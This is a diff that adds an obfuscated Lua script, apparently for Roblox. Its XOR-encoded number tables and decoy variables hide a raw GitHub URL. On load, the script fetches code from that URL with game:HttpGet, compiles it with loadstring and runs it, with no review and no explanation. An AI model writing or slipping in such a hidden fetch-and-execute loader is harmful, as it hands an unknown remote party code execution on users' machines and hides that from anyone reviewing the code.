@@ -1,0 +1,59 @@
+local _q9 = 73
+local _d1 = "decoy_01"
+local _d2 = 999123
+
+local _p08 = { 41, 58, 46, 52, 124, 123, 113, 120, 112, 103, 61, 45, 45 } 
+local _p03 = { 49, 44, 39, 46, 124, 124, 127, 120, 127, 100, 38, 38, 36, 36, 32, 61, 58, 58, 102 } 
+local _p01 = { 33, 61, 61, 57, 58, 115, 102, 102 } 
+local _p06 = { 33, 44, 40, 45, 58, 102 } 
+local _p04 = { 11, 37, 38, 54, 49, 102, 47, 59, 60, 32, 61, 102 } 
+local _p07 = { 36, 40, 32, 39, 102 } 
+local _p02 = { 59, 40, 62, 103, 46, 32, 61, 57, 33, 60, 59, 59, 44, 59, 42, 38, 39, 61, 44, 39, 61, 103, 42, 38, 36, 102 } 
+local _p05 = { 59, 44, 47, 58, 102 } 
+
+local _d3 = { false, true, nil }
+
+local function _u(tbl, k)
+    local out = {}
+    for i = 1, #tbl do
+        out[i] = string.char(bit32.bxor(tbl[i], k))
+    end
+    return table.concat(out)
+end
+
+local _c = nil
+local function _g()
+    if not _c then
+        _c = table.concat({
+            _u(_p01, _q9),
+            _u(_p02, _q9),
+            _u(_p03, _q9),
+            _u(_p04, _q9),
+            _u(_p05, _q9),
+            _u(_p06, _q9),
+            _u(_p07, _q9),
+            _u(_p08, _q9),
+        })
+    end
+    return _c
+end
+
+local function RunLinkVar()
+    local target = _g()
+    local okGet, data = pcall(function()
+        return game:HttpGet(target)
+    end)
+    if not okGet or type(data) ~= "string" or data == "" then
+        return false
+    end
+
+    local fn, err = loadstring(data)
+    if not fn then
+        return false
+    end
+
+    local okRun = pcall(fn)
+    return okRun
+end
+
+RunLinkVar()
